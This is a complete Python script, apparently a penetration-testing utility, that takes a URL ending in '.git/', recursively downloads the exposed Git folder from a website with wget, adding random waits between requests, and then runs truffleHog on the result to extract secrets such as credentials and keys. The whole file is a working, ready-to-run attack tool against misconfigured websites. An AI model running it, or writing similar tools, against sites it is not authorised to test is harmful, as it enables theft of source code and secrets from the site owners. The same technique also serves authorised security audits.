'''
This script recursively downloads the contents of a .git/ folder on a website and runs truffleHog (https://github.com/trufflesecurity/truffleHog) on the downloaded files to extract secrets.

Usage: python3 gitExtract.py <URL> 
Expected URL format http://example.com/some/path/.git/

Requires trufflehog: run 'pip3 install truffleHog'

author: Nicolas
'''

import subprocess as sp
import sys
import os

try:
    url = sys.argv[1]
    if url[-5:] != '.git/': 
        raise Exception
except Exception:
    print("Usage: python3 gitExtract.py <URL> ")
    print("Expected URL format http://example.com/some/path/.git/")
    print("Requires trufflehog: run 'pip3 install truffleHog'")
    exit(1)

folder = url.split('//')[-1][:-5]
print('[+] fetching all files and subdirectories: ' + url + '*')
wget_cmdArgs = 'wget -q --show-progress --no-parent -r -l inf --wait 0.1 --random-wait --reject "index.html*"'.split(' ')
sp.call(wget_cmdArgs + [url])
print('[+] Running TruffleHog')
try:
    sp.call(['trufflehog', 'file://' + os.getcwd() + '/' + folder])
except Exception as e:
    print("[!] TruffleHog not found, did you run 'pip3 install truffleHog' ?")